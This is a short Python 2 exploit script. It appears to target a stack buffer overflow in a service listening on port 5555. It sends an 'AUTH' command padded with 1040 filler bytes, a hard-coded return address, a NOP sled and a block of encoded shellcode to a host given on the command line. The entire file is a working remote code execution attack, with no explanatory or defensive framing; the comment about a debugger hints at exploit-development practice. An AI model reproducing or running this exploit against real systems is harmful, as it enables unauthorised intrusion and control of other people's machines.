#!/usr/bin/python
import time, struct, sys
import socket as so

try:
	server = sys.argv[1]
	port = 5555
except IndexError:
	print "[+] Usage %s host" % sys.argv[0]
	sys.exit()

#req1 = "AUTH " + "\x41"*1072

shellcode = ("\xda\xca\xbb\x28\xab\x24\x3f\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x58\x17\x83\xc0\x04\x03\x70\xb8\xc6\xca\x7c\x56\x84"
"\x35\x7c\xa7\xe9\xbc\x99\x96\x29\xda\xea\x89\x99\xa8\xbe\x25"
"\x51\xfc\x2a\xbd\x17\x29\x5d\x76\x9d\x0f\x50\x87\x8e\x6c\xf3"
"\x0b\xcd\xa0\xd3\x32\x1e\xb5\x12\x72\x43\x34\x46\x2b\x0f\xeb"
"\x76\x58\x45\x30\xfd\x12\x4b\x30\xe2\xe3\x6a\x11\xb5\x78\x35"
"\xb1\x34\xac\x4d\xf8\x2e\xb1\x68\xb2\xc5\x01\x06\x45\x0f\x58"
"\xe7\xea\x6e\x54\x1a\xf2\xb7\x53\xc5\x81\xc1\xa7\x78\x92\x16"
"\xd5\xa6\x17\x8c\x7d\x2c\x8f\x68\x7f\xe1\x56\xfb\x73\x4e\x1c"
"\xa3\x97\x51\xf1\xd8\xac\xda\xf4\x0e\x25\x98\xd2\x8a\x6d\x7a"
"\x7a\x8b\xcb\x2d\x83\xcb\xb3\x92\x21\x80\x5e\xc6\x5b\xcb\x36"
"\x2b\x56\xf3\xc6\x23\xe1\x80\xf4\xec\x59\x0e\xb5\x65\x44\xc9"
"\xba\x5f\x30\x45\x45\x60\x41\x4c\x82\x34\x11\xe6\x23\x35\xfa"
"\xf6\xcc\xe0\xad\xa6\x62\x5b\x0e\x16\xc3\x0b\xe6\x7c\xcc\x74"
"\x16\x7f\x06\x1d\xbd\x7a\xc1\x28\x49\x84\x69\x45\x4f\x84\x88"
"\x2e\xc6\x62\xe0\x40\x8f\x3d\x9d\xf9\x8a\xb5\x3c\x05\x01\xb0"
"\x7f\x8d\xa6\x45\x31\x66\xc2\x55\xa6\x86\x99\x07\x61\x98\x37"
"\x2f\xed\x0b\xdc\xaf\x78\x30\x4b\xf8\x2d\x86\x82\x6c\xc0\xb1"
"\x3c\x92\x19\x27\x06\x16\xc6\x94\x89\x97\x8b\xa1\xad\x87\x55"
"\x29\xea\xf3\x09\x7c\xa4\xad\xef\xd6\x06\x07\xa6\x85\xc0\xcf"
"\x3f\xe6\xd2\x89\x3f\x23\xa5\x75\xf1\x9a\xf0\x8a\x3e\x4b\xf5"
"\xf3\x22\xeb\xfa\x2e\xe7\x0b\x19\xfa\x12\xa4\x84\x6f\x9f\xa9"
"\x36\x5a\xdc\xd7\xb4\x6e\x9d\x23\xa4\x1b\x98\x68\x62\xf0\xd0"
"\xe1\x07\xf6\x47\x01\x02")

req1 = "AUTH " + "\x41" * 1040 + "\x71\x1D\xD1\x65" + "\x90" * 8 + shellcode
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
	 s.connect((server, port))
	 print repr(s.recv(1024))
	 s.send(req1)
	 print repr(s.recv(1024))
except:
	 print "[!] connection refused, check debugger"
s.close()